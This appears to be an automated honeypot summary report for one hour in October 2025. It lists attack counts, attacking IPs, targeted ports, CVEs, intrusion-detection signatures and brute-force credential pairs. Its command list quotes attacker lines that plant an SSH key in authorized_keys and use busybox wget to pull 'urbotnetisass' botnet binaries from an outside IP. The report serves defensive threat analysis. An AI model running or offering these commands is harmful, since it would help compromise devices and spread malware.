### Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01 13:05:01 UTC
**Timeframe:** 2025-10-01 12:20:01 UTC to 2025-10-01 13:00:01 UTC
**Files Used:**
* agg_log_20251001T122001Z.json
* agg_log_20251001T124001Z.json
* agg_log_20251001T130001Z.json

### Executive Summary

Over the past hour, our honeypot network detected a total of 8,283 attacks. The majority of these attacks targeted the Cowrie honeypot, indicating a high volume of SSH brute-force attempts. A significant number of attacks also targeted the Honeytrap, Suricata, and Ciscoasa honeypots. The most prominent attacking IP address was 92.242.166.161, and the most targeted port was 25 (SMTP), followed closely by port 22 (SSH). Several vulnerabilities were targeted, with CVE-2002-0013 and CVE-2002-0012 being the most common. Attackers were observed attempting to download and execute malicious files, specifically variants of "urbotnetisass".

### Detailed Analysis

**Attacks by Honeypot:**
* Cowrie: 3,019
* Honeytrap: 1,714
* Suricata: 1,439
* Ciscoasa: 1,425
* Mailoney: 432
* Dionaea: 68
* Sentrypeer: 33
* Adbhoney: 21
* Redishoneypot: 24
* Tanner: 26
* H0neytr4p: 29
* ConPot: 15
* ElasticPot: 11
* Miniprint: 14
* Dicompot: 6
* Ipphoney: 4
* Honeyaml: 3

**Top Attacking IPs:**
* 92.242.166.161
* 67.217.243.120
* 185.156.73.166
* 185.156.73.167
* 89.44.137.176
* 92.63.197.55
* 92.63.197.59
* 88.210.63.16
* 187.33.59.116
* 160.251.196.99
* 64.227.184.250
* 45.140.17.52
* 189.124.17.190
* 156.238.229.20
* 191.242.105.131
* 103.67.78.42
* 211.253.10.96
* 157.10.52.61
* 43.225.158.4

**Top Targeted Ports/Protocols:**
* 25
* 22
* 8333
* UDP/161
* 5060
* TCP/22
* 23
* 27017
* 443
* 80
* TCP/5432
* 6379

**Most Common CVEs:**
* CVE-2002-0013 CVE-2002-0012
* CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
* CVE-2021-3449 CVE-2021-3449
* CVE-2019-11500 CVE-2019-11500
* CVE-2001-0414
* CVE-2024-3721 CVE-2024-3721

**Commands Attempted by Attackers:**
* `cd ~; chattr -ia .ssh; lockr -ia .ssh`
* `lockr -ia .ssh`
* `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
* `cat /proc/cpuinfo | grep name | wc -l`
* `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
* `uname -a`
* `whoami`
* `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

**Signatures Triggered:**
* ET DROP Dshield Block Listed Source group 1
* 2402000
* ET SCAN MS Terminal Server Traffic on Non-standard Port
* 2023753
* ET SCAN NMAP -sS window 1024
* 2009582
* ET HUNTING RDP Authentication Bypass Attempt
* 2034857
* GPL INFO SOCKS Proxy attempt
* 2100615
* ET INFO Reserved Internal IP Traffic
* 2002752
* ET SCAN Potential SSH Scan
* 2001219
* ET DROP Spamhaus DROP Listed Traffic Inbound group 32
* 2400031

**Users / Login Attempts:**
* 345gs5662d34/345gs5662d34
* root/3245gs5662d34
* foundry/foundry
* root/test1111
* admin/admin
* superadmin/admin123
* no-reply/no-reply

**Files Uploaded/Downloaded:**
* arm.urbotnetisass
* arm5.urbotnetisass
* arm6.urbotnetisass
* arm7.urbotnetisass
* x86_32.urbotnetisass
* mips.urbotnetisass
* mipsel.urbotnetisass

**HTTP User-Agents:**
* Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36

**SSH Clients and Servers:**
* No specific SSH clients or server versions were logged in the provided data.

**Top Attacker AS Organizations:**
* No specific AS organizations were logged in the provided data.

### Key Observations and Anomalies

*   **Coordinated Attacks:** The consistent use of the same SSH key and reconnaissance commands across multiple attacking IPs suggests a coordinated campaign.
*   **Malware Delivery:** The commands to download and execute `urbotnetisass` variants indicate attempts to deploy malware on compromised devices.
*   **High Volume of SMTP Traffic:** The large number of connections to port 25 suggests that attackers may be attempting to use the honeypot as a mail relay for spam or other malicious activities.
*   **Targeting of Older Vulnerabilities:** The frequent triggering of alerts for older CVEs like CVE-2002-0013 indicates that attackers are still scanning for and attempting to exploit legacy vulnerabilities.
*   **Lack of Evasion:** Many of the attacks are noisy and easily detectable, suggesting that the attackers are not highly sophisticated or are targeting a wide range of systems with automated tools.
